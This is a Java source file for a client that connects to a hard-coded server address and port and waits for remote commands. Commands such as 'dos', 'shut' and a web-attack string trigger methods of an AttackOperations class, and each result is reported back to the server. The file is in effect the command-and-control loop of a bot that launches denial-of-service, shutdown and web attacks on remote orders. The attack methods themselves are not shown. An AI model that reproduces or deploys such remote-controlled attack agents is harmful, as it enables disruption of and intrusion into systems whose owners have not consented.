import java.net.*;
import java.io.*;
public class Client {
	
	ChatWithServer cws = new ChatWithServer();
	
	public void ConnectToServer(){
		try{
			int port = 25000;
			String ip = "172.16.60.43";
			Socket s = new Socket(ip,port);
			DataInputStream din = new DataInputStream(s.getInputStream());
			DataOutputStream dout = new DataOutputStream(s.getOutputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
			AttackOperations op = new AttackOperations();
			String send="",recive="";
			
			while(!recive.equals("stop")){
				
				recive = din.readUTF();
				
				if(recive.equals("dos")){
					send=op.dosAttack();
					dout.writeUTF(send);
					dout.flush();
				}
				
				else if(recive.length()>7){
					send=op.webAttack(recive);
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("shut")){
					send=op.shutDown();
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("shock")){
					send=op.shockAttack();
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("light")){
					send=op.lightAttack();
					dout.writeUTF(send);
					dout.flush();
				}
				else if(recive.equals("chat")){
					try{
						cws.Chat(ip,port+1);
					}
					catch (Exception e){
						System.out.println("here");
					}
				}
				

			}
			
			s.close();
		}
		catch(Exception e){
			System.out.println("error at client :"+e.getMessage());
		}
	}
}
